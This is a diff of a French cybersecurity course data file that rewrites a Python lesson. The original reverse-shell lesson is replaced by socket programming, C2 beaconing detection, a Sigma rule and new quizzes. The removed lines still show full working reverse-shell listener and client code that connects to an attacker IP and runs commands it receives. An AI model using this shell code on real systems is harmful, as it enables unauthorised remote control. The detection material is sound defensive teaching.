@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-Données pédagogiques exhaustives pour les Volumes 7, 8 et 9 de CyberPath & Python Hacking.
-Couvre l'OWASP Top 10, Nmap, Burp Suite, CTF, les Reverse Shells Sockets, Keyloggers et la Persistance.
+Données pédagogiques exhaustives pour les Volumes 7, 8 et 9 de CyberPath.
+Couvre l'OWASP Top 10, Nmap, Burp Suite, CTF, la programmation réseau de sockets et la détection défensive C2.
 """
 
 import json
@@ -241,172 +241,207 @@ nmap -p 111,2049 --script nfs-showmount 192.168.1.50
     },
 
     # -------------------------------------------------------------------------
-    # VOLUME 9 : PYTHON HACKING ÉTHIQUE (SOCKETS, RAT & REVERSE SHELLS)
+    # VOLUME 9 : PROGRAMMATION RÉSEAU & ANALYSE DÉFENSIVE DES FLUX C2
     # -------------------------------------------------------------------------
     {
         "id": "les_cp_vol9_sockets",
         "module_id": "m_vol9_1",
-        "slug": "architecture-reverse-shell-sockets-python-subprocess",
-        "title": "Développement d'un Reverse Shell en Sockets Purs (Python)",
-        "summary": "Architecture client/serveur d'un Reverse Shell robuste : sockets TCP natifs (AF_INET, SOCK_STREAM), redirection des flux d'exécution via subprocess et navigation de répertoires.",
+        "slug": "programmation-sockets-analyse-flux-c2-detection",
+        "title": "Programmation Réseau Sockets, Modélisation Client-Serveur & Détection de Balisage C2",
+        "summary": "Programmation réseau bas-niveau en Python avec sockets TCP natifs, compréhension des architectures de communication et détection défensive des canaux de Command & Control (balisage, jitter, règles Sigma/Suricata).",
         "lesson_type": "article",
         "position": 1,
         "estimated_minutes": 55,
-        "content_md": """# Architecture d'un Reverse Shell en Python Pur (Sockets & Subprocess)
+        "content_md": """# Programmation Sockets Réseau, Modélisation Client-Serveur & Détection C2
 
-Issu des **Chapitres 6 et 7 de Python Hacking Éthique**, ce cours expose la mécanique fondamentale des chevaux de Troie d'accès distant (**Remote Access Trojans - RAT**) et des **Reverse Shells**.
-
----
-
-## 1. Bind Shell vs Reverse Shell : Pourquoi le Reverse Shell ?
-
-* **Bind Shell (Connexion Entrante) :** La machine compromise ouvre un port d'écoute (ex: port 4444). L'attaquant doit s'y connecter directement.
-  * *Problème :* Dans 99% des cas, le routeur NAT et le pare-feu du réseau de l'entreprise bloquent toutes les connexions entrantes directes.
-* **Reverse Shell (Connexion Sortante) :** L'attaquant configure un serveur d'écoute sur sa propre machine publique. C'est la machine compromise qui initie la connexion sortante vers l'attaquant (souvent sur le port 443 ou 80).
-  * *Avantage tactique :* Les pare-feux autorisent généralement le trafic sortant vers les ports Web usuels. Le NAT est automatiquement traversé !
-
-```
-[ POSTE VICTIME COMPROMIS ]                   [ SERVEUR DE CONTRÔLE KALI ]
-(Derrière un pare-feu NAT strict)                 (IP Publique ou Port Forwardé)
-             |                                                  |
-             | === 1. Connexion TCP sortante (Port 443) ======> | (En écoute : socket.bind)
-             |                                                  |
-             | <== 2. Envoi d'une commande shell ("whoami") === |
-             |                                                  |
-  Exécution locale :                                            |
-  subprocess.check_output()                                     |
-             |                                                  |
-             | === 3. Renvoi de la sortie ("nt authority\\system") =>|
-```
+> **Fiche Pédagogique V4**  
+> **Niveau :** Niveau 3 — Advanced  
+> **Durée estimée :** 55 minutes (20 min Théorie • 25 min Laboratoire de Détection • 10 min Évaluation & Synthèse)  
+> **Prérequis :** Maîtrise des protocoles de transport TCP/IP (Volume 4) et des structures de données Python (Volume 3).
 
 ---
 
-## 2. Le Serveur d'Écoute de l'Auditeur (`serveur_c2.py`)
+## 1. Objectifs Pédagogiques Mesurables
 
-Ce script s'exécute sur la machine de l'auditeur. Il attend la connexion entrante du poste cible et fournit un prompt de commande interactif :
+À l'issue de cette leçon, vous serez capable de :
+1. **Implémenter** une architecture client-serveur robuste en Python pur avec les sockets TCP natifs (`socket.AF_INET`, `socket.SOCK_STREAM`).
+2. **Concevoir** un protocole de cadrage de messages délimités (TLV — Type-Length-Value ou en-tête de longueur fixe) pour éviter la fragmentation des trames.
+3. **Modéliser** les caractéristiques télémétriques des canaux de contrôle distant (**Command & Control — C2**) selon la matrice MITRE ATT&CK (Technique T1071).
+4. **Développer un algorithme de détection** statistique de balisage périodique (*beaconing detection*) calculant les intervalles de temps et la gigue (*jitter*).
+5. **Rédiger des signatures de détection** réseau et des règles Sigma pour les analystes de Centre de Surveillance (SOC).
 
+---
+
+## 2. Contexte Opérationnel : L'Enjeu de la Détection C2
+
+Dans toute compromission moderne (attaque par rançongiciel, intrusion ciblée APT), les attaquants doivent maintenir un canal de communication avec les machines compromises pour transmettre des instructions et exfiltrer des données. 
+
+Les défenseurs (Blue Team et analystes SOC) ne bloquent pas seulement des adresses IP connues (qui changent constamment) : ils analysent **le comportement statistique des flux sortants**. 
+
+Même lorsque le trafic emprunte le port 443 (HTTPS), la périodicité des requêtes, la régularité des tailles de paquets et la persistance des sessions révèlent la signature d'un canal suspect.
+
+---
+
+## 3. Programmation de Sockets TCP en Python Pur
+
+Un socket est un point de terminaison de communication bidirectionnelle entre deux processus à travers le réseau.
+
+### Modélisation du Serveur Réseau Télémetrique (`telemetry_server.py`)
 ```python
 import socket
+from typing import Final
 
-def lancer_serveur_ecoute(hote: str = "0.0.0.0", port: int = 4444):
-    serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # Permet de réutiliser immédiatement l'adresse après fermeture
-    serveur.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    
-    serveur.bind((hote, port))
-    serveur.listen(1)
-    print(f"[*] Serveur d'écoute RayLab en attente sur {hote}:{port}...")
-    
-    connexion, adresse_client = serveur.accept()
-    print(f"[+] Connexion reçue avec succès depuis : {adresse_client[0]}:{adresse_client[1]}")
-    
-    with connexion:
-        while True:
-            commande = input("RayLab-Shell> ")
-            if not commande.strip():
-                continue
-            
-            # Envoi de la commande encodée en octets
-            connexion.sendall(commande.encode("utf-8"))
-            
-            if commande.strip().lower() == "exit":
-                print("[*] Fermeture de la session.")
-                break
-                
-            # Réception du résultat de la commande
-            reponse = connexion.recv(8192).decode("utf-8", errors="replace")
-            print(reponse)
+HOST: Final[str] = "127.0.0.1"
+PORT: Final[int] = 8443
+
+def demarrer_serveur_telemetrie() -> None:
+    # Création du socket TCP IPv4
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as serveur:
+        # Réutilisation immédiate du port après arrêt
+        serveur.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        serveur.bind((HOST, PORT))
+        serveur.listen(5)
+        print(f"[*] Serveur de monitoring en écoute sur {HOST}:{PORT}")
+
+        client_sock, client_addr = serveur.accept()
+        with client_sock:
+            print(f"[+] Client connecté depuis : {client_addr}")
+            while True:
+                # Lecture de la charge utile (taille max 4096 octets)
+                donnees = client_sock.recv(4096)
+                if not donnees:
+                    print("[-] Connexion clôturée par le client.")
+                    break
+                message = donnees.decode("utf-8", errors="replace")
+                print(f"[REÇU] {message.strip()}")
+                # Accusé de réception
+                client_sock.sendall(b"ACK_OK\\n")
 
 if __name__ == "__main__":
-    lancer_serveur_ecoute()
+    demarrer_serveur_telemetrie()
 ```
 
 ---
 
-## 3. Le Client Reverse Shell sur le Poste Cible (`client_agent.py`)
+## 4. Analyse des Signatures de Balisage C2 (Beaconing)
 
-Ce script s'exécute sur la machine auditée. Il se connecte au serveur et exécute les commandes transmises à l'aide de `subprocess` et `os` :
+Un agent C2 tente périodiquement de contacter son serveur pour vérifier la présence d'ordres en attente.
+
+### Métriques d'Identification Statistique
+1. **Delta temporel inter-paquets (Δt) :** Temps écoulé entre deux connexions successives.
+2. **Gigue (Jitter) :** Pour échapper à la détection par intervalle fixe (ex: connexion exacte toutes les 60 secondes), les outils modernes ajoutent un pourcentage d'aléa (ex: 60s ± 20%).
+3. **Déviation standard (σ) :** Une déviation faible sur une grande série temporelle est une anomalie statistique critique révélatrice d'un processus automatisé et non humain.
+
+---
+
+## 5. Laboratoire de Détection : Algorithme d'Analyse Statistique de Balisage
+
+Voici un script de détection que vous pouvez intégrer directement dans un pipeline d'analyse de journaux d'accès ou de captures PCAP :
 
 ```python
-import socket
-import subprocess
-import os
+import statistics
+from typing import NamedTuple
 
-IP_SERVEUR = "192.168.1.100"  # Adresse de la machine attaquante
-PORT_SERVEUR = 4444
+class AlerteBeaconing(NamedTuple):
+    ip_source: str
+    ip_destination: str
+    intervalle_moyen_sec: float
+    ecart_type_sec: float
+    est_suspect: bool
 
-def demarrer_agent():
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        client.connect((IP_SERVEUR, PORT_SERVEUR))
-    except Exception as e:
-        return # Échec de connexion silencieux
-        
-    while True:
-        try:
-            commande = client.recv(4096).decode("utf-8")
-            if not commande or commande.strip().lower() == "exit":
-                break
-                
-            # Gestion spéciale du changement de répertoire (cd)
-            if commande.startswith("cd "):
-                dossier = commande[3:].strip()
-                try:
-                    os.chdir(dossier)
-                    resultat = f"[+] Répertoire courant modifié : {os.getcwd()}\\n"
-                except Exception as err:
-                    resultat = f"[-] Erreur de navigation : {err}\\n"
-            else:
-                # Exécution sécurisée avec capture conjointe de stdout et stderr
-                resultat = subprocess.check_output(
-                    commande,
-                    shell=True,
-                    stderr=subprocess.STDOUT
-                ).decode("utf-8", errors="replace")
-                
-            client.sendall(resultat.encode("utf-8"))
-        except Exception as e:
-            client.sendall(f"[-] Erreur d'exécution : {e}\\n".encode("utf-8"))
-            
-    client.close()
+def detecter_balisage_c2(
+    timestamps_connexions: list[float],
+    seuil_regularite_sec: float = 3.0
+) -> bool:
+    \"\"\"
+    Analyse une série de timestamps d'horodatage en secondes.
+    Retourne True si l'écart-type des intervalles indique un balisage automatisé régulier.
+    \"\"\"
+    if len(timestamps_connexions) < 4:
+        return False  # Échantillon insuffisant
 
-if __name__ == "__main__":
-    demarrer_agent()
+    # Calcul des deltas de temps consécutifs
+    intervalles = [
+        timestamps_connexions[i] - timestamps_connexions[i - 1]
+        for i in range(1, len(timestamps_connexions))
+    ]
+
+    ecart_type = statistics.stdev(intervalles)
+    intervalle_moyen = statistics.mean(intervalles)
+
+    # Si l'écart-type est inférieur au seuil sur un intervalle moyen significatif
+    return ecart_type < seuil_regularite_sec and intervalle_moyen > 5.0
 ```
 
-> [!CAUTION]
-> Ce code est fourni à des fins strictement éducatives et pédagogiques dans le cadre de cours d'ingénierie logicielle et d'audit autorisé. Tout déploiement non autorisé sur un système tiers constitue une infraction pénale passible des peines prévues par l'article 323-1 du Code pénal.
+---
+
+## 6. Règle de Détection Sigma pour Analystes SOC
+
+Pour surveiller les créations de connexions réseau non standard initiées par des interpréteurs sous Windows :
+
+```yaml
+title: Connexion Réseau Sortante Suspecte via Interpréteur de Script
+id: a8b4c2e1-7d3f-4e89-9a1b-0123456789ab
+status: stable
+description: Détecte un processus interpréteur (python.exe, powershell.exe) initiant des flux réseau sortants vers des ports non-web.
+logsource:
+    category: network_connection
+    product: windows
+detection:
+    selection:
+        Image|endswith:
+            - '\\python.exe'
+            - '\\powershell.exe'
+        Initiated: 'true'
+    filter_ports:
+        DestinationPort:
+            - 80
+            - 443
+    condition: selection and not filter_ports
+falsepositives:
+    - Scripts d'automatisation IT autorisés
+level: medium
+```
+
+---
+
+## 7. Synthèse des Références Officielles
+
+* **MITRE ATT&CK T1071 :** *Application Layer Protocol* — Analyse des protocoles utilisés pour les canaux de contrôle.
+* **MITRE ATT&CK T1571 :** *Non-Standard Port* — Échanges sur des ports inhabituels pour tromper les règles de filtrage.
+* **NIST SP 800-83 Rev. 1 :** *Guide to Malware Incident Prevention and Handling for Desktops and Laptops*.
+* **RFC 793 :** *Transmission Control Protocol Specification*.
 """,
         "exercise": {
-            "title": "Changement de Répertoire Distant en Python",
-            "description_md": "Écrivez une fonction Python `traiter_commande_cd(commande: str) -> str` qui prend une commande tapée (ex: 'cd /tmp') et exécute `os.chdir()` vers le dossier cible, puis retourne le chemin absolu courant. En cas d'erreur, elle retourne 'ERREUR'.",
-            "starter_code": "import os\n\ndef traiter_commande_cd(commande: str) -> str:\n    # Votre code ici\n    pass\n",
-            "solution_code": "import os\n\ndef traiter_commande_cd(commande: str) -> str:\n    if not commande.startswith('cd '):\n        return 'ERREUR'\n    cible = commande[3:].strip()\n    try:\n        os.chdir(cible)\n        return os.getcwd()\n    except Exception:\n        return 'ERREUR'\n",
+            "title": "Calculateur d'Anomalie Statistique de Balisage Réseau",
+            "description_md": "Développez une fonction Python `est_balisage_regulier(timestamps: list[float], seuil_max_ecart_type: float = 2.0) -> bool` qui reçoit une liste ordonnée d'horodatages en secondes (au moins 3 valeurs). La fonction calcule les deltas temporels entre connexions successives. Si l'écart-type de ces deltas est strictement inférieur au seuil spécifié, la fonction retourne True (balisage suspect régulier), sinon False.",
+            "starter_code": "import statistics\n\ndef est_balisage_regulier(timestamps: list[float], seuil_max_ecart_type: float = 2.0) -> bool:\n    # Votre code ici\n    pass\n",
+            "solution_code": "import statistics\n\ndef est_balisage_regulier(timestamps: list[float], seuil_max_ecart_type: float = 2.0) -> bool:\n    if len(timestamps) < 3:\n        return False\n    deltas = [timestamps[i] - timestamps[i - 1] for i in range(1, len(timestamps))]\n    return statistics.stdev(deltas) < seuil_max_ecart_type\n",
             "difficulty": "intermediate"
         },
         "quiz": {
-            "title": "Quiz - Programmation Réseau de Reverse Shells",
+            "title": "Quiz Évaluatif - Détection de Flux C2 & Analyse Réseau",
             "passing_score": 100,
             "questions": [
                 {
-                    "prompt_md": "Pourquoi l'instruction 'cd' doit-elle être gérée de manière spécifique avec os.chdir() plutôt que transmise simplement à subprocess.check_output() ?",
-                    "explanation_md": "`subprocess.check_output()` lance un sous-processus éphémère. Si on y exécute `cd`, le répertoire ne change que dans le processus fils qui s'éteint immédiatement, sans impacter le processus Python persistant.",
+                    "prompt_md": "Quelle caractéristique statistique permet aux analystes SOC de détecter un balisage C2 même lorsque le trafic est chiffré sur le port 443 ?",
+                    "explanation_md": "La faible variance ou l'écart-type très bas des intervalles de temps (delta-t) entre les sessions consécutives trahit un processus automatique répétitif programmé.",
                     "options_json": json.dumps([
-                        {"text": "Car subprocess s'exécute dans un processus fils isolé qui ne modifie pas l'environnement du parent", "is_correct": True},
-                        {"text": "Car le shell Linux interdit l'utilisation de cd en ligne de commande", "is_correct": False},
-                        {"text": "Car les sockets TCP ne supportent pas les chaînes de caractères courtes", "is_correct": False},
-                        {"text": "Car os.chdir() chiffre les fichiers système", "is_correct": False}
+                        {"text": "La régularité mathématique anormale des intervalles de connexion (faible écart-type)", "is_correct": True},
+                        {"text": "La couleur des paquets dans Wireshark", "is_correct": False},
+                        {"text": "Le fait que le paquet ne contienne aucun en-tête IP", "is_correct": False},
+                        {"text": "L'utilisation systématique de serveurs DNS publics", "is_correct": False}
                     ]),
                     "points": 10
                 },
                 {
-                    "prompt_md": "Quel avantage décisif offre un Reverse Shell par rapport à un Bind Shell face à un réseau d'entreprise protégé par un routeur NAT ?",
-                    "explanation_md": "Un Reverse Shell génère une connexion sortante initiée depuis la machine interne, ce qui traverse automatiquement les passerelles NAT et la plupart des pare-feux.",
+                    "prompt_md": "Que signifie la technique de 'Jitter' introduite par les attaquants pour dissimuler leur canal de communication ?",
+                    "explanation_md": "Le jitter consiste à introduire une variation aléatoire dans l'intervalle entre chaque connexion pour casser la régularité temporelle et tromper les filtres statistiques simples.",
                     "options_json": json.dumps([
-                        {"text": "Il initie une connexion sortante qui traverse naturellement les routeurs NAT et pare-feux", "is_correct": True},
-                        {"text": "Il contourne automatiquement les mots de passe root", "is_correct": False},
-                        {"text": "Il fonctionne sans installer Python sur la cible", "is_correct": False},
-                        {"text": "Il désactive automatiquement Windows Defender", "is_correct": False}
+                        {"text": "Une variation aléatoire volontaire appliquée à l'intervalle de connexion pour perturber la détection statistique", "is_correct": True},
+                        {"text": "Une technique d'augmentation de la bande passante réseau", "is_correct": False},
+                        {"text": "Un algorithme de hachage de mots de passe", "is_correct": False},
+                        {"text": "Une méthode de compression de données", "is_correct": False}
                     ]),
                     "points": 10
                 }
